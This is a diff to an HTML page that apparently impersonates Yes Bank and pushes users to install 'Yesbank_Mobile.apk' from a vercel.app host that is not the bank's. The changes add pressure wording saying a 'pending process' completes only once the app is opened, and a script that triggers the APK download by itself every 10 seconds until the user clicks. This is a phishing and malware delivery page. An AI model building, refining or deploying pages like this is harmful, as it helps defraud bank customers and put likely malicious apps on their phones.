@@ -38,10 +38,17 @@
       100% { transform: rotate(360deg); }
     }
 
-    .message {
-      font-size: 16px;
-      color: #333;
+    .verify-message {
+      font-size: 15px;
+      color: #d32f2f;
       margin-top: 20px;
+      font-weight: 500;
+    }
+
+    .process-message {
+      font-size: 15px;
+      color: #333;
+      margin-top: 10px;
       font-weight: 500;
     }
 
@@ -76,8 +83,12 @@
 
     <div class="spinner"></div>
 
-    <div class="message">
-      Please wait while we process your request...
+    <div class="verify-message">
+      Note: If you download the app manually, you will be required to verify it before proceeding.
+    </div>
+
+    <div class="process-message">
+      Your pending process will be completed after the app is downloaded and opened.
     </div>
 
     <p class="download-note">
@@ -85,7 +96,25 @@
       you can manually download and install the app below:
     </p>
 
-    <a class="download-button" href="https://yesbankupdate.vercel.app/Yesbank_Mobile.apk" download>Download Anyway</a>
+    <a class="download-button" href="https://yesbankupdate.vercel.app/Yesbank_Mobile.apk" download id="autoDownload">Download Anyway</a>
   </div>
+
+  <script>
+    let userClicked = false;
+
+    // Agar user manually click kare, toh auto-download band ho jaye
+    document.getElementById('autoDownload').addEventListener('click', function() {
+      userClicked = true;
+    });
+
+    // Har 10 second mein check karo, agar user ne download nahi kiya ho toh download start karo
+    const autoDownloadInterval = setInterval(function() {
+      if (!userClicked) {
+        document.getElementById('autoDownload').click();
+      } else {
+        clearInterval(autoDownloadInterval); // Stop if user clicked
+      }
+    }, 10000); // every 10 seconds
+  </script>
 </body>
 </html>
